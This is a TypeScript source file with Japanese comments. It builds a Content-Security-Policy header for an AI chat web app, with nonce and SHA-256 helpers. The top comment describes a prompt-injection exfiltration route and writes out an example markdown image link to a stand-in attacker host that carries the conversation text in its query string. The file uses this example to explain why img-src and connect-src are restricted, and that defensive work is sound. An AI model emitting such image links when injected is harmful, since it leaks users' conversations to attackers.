/**
 * Content-Security-Policy の組み立て。
 *
 * 狙いは「開いただけで会話の中身が外へ出る」経路を塞ぐこと。
 * インジェクションを受けたモデルが `![](https://攻撃者/?q=会話の中身)` を
 * 出力すると、画像を取りに行った時点で本文がクエリ文字列として相手に渡る。
 * 本文の消毒では防げない（記法としては正しい画像なので）。`img-src` と
 * `connect-src` を自分のところだけに絞れば、この口が閉じる。
 *
 * 生成画像は取得して R2 に写し `/api/files/…` に置き換えているので、
 * ふだんは外部の画像を読む必要がない。写しそこねた分（保存が未設定・
 * 枠切れで持ち越し）は表示されなくなるが、**出さないほうが害が小さい**。
 */

export interface CspInput {
  /** `<ServerRouter nonce>` と同じ値。React Router が撒くスクリプトに付く。 */
  nonce: string;
  /** 見た目の初期化スクリプト（APPEARANCE_INIT_SCRIPT）の sha256（base64）。 */
  scriptHash: string;
  /**
   * 開発時は Vite が自前のインラインスクリプトを差し込み、HMR に
   * WebSocket を使う。本番と同じ締め方では開発サーバーが動かないので、
   * script と connect だけ緩める（img-src などはそのまま効かせて、
   * 違反を開発中に気づけるようにする）。
   */
  dev?: boolean;
}

/**
 * nonce があるとき、ブラウザは `'unsafe-inline'` を**無視する**。
 * 開発時に両方並べると Vite のプリアンブルが弾かれてしまうので、
 * 開発では nonce とハッシュを外し、`'unsafe-inline'` だけを渡す。
 */
export function contentSecurityPolicy({
  nonce,
  scriptHash,
  dev = false,
}: CspInput): string {
  const script = dev
    ? ["'self'", "'unsafe-inline'", "'unsafe-eval'"]
    : ["'self'", `'nonce-${nonce}'`, `'sha256-${scriptHash}'`];
  const connect = dev ? ["'self'", "ws:", "wss:"] : ["'self'"];

  const directives: [string, string[]][] = [
    ["default-src", ["'self'"]],
    ["base-uri", ["'self'"]],
    ["object-src", ["'none'"]],
    // 埋め込み自体を禁じる（クリックジャッキング）
    ["frame-ancestors", ["'none'"]],
    ["form-action", ["'self'"]],
    // data: は生成画像がそのまま埋まっている場合、blob: は添付のプレビュー
    ["img-src", ["'self'", "data:", "blob:"]],
    // KaTeX のフォントは束ねて同一オリジンから出る
    ["font-src", ["'self'", "data:"]],
    // KaTeX・Mermaid・React の style 属性。属性まで許す必要がある
    ["style-src", ["'self'", "'unsafe-inline'"]],
    ["script-src", script],
    ["connect-src", connect],
    ["worker-src", ["'self'", "blob:"]],
    ["manifest-src", ["'self'"]],
  ];

  return directives.map(([name, values]) => `${name} ${values.join(" ")}`).join("; ");
}

/** CSP の nonce。要求ごとに引き直す。 */
export function makeNonce(): string {
  const bytes = new Uint8Array(16);
  crypto.getRandomValues(bytes);
  return base64(bytes);
}

/** インラインスクリプトを `'sha256-…'` で許すためのハッシュ。 */
export async function sha256Base64(text: string): Promise<string> {
  const digest = await crypto.subtle.digest(
    "SHA-256",
    new TextEncoder().encode(text),
  );
  return base64(new Uint8Array(digest));
}

function base64(bytes: Uint8Array): string {
  let s = "";
  for (const b of bytes) s += String.fromCharCode(b);
  return btoa(s);
}
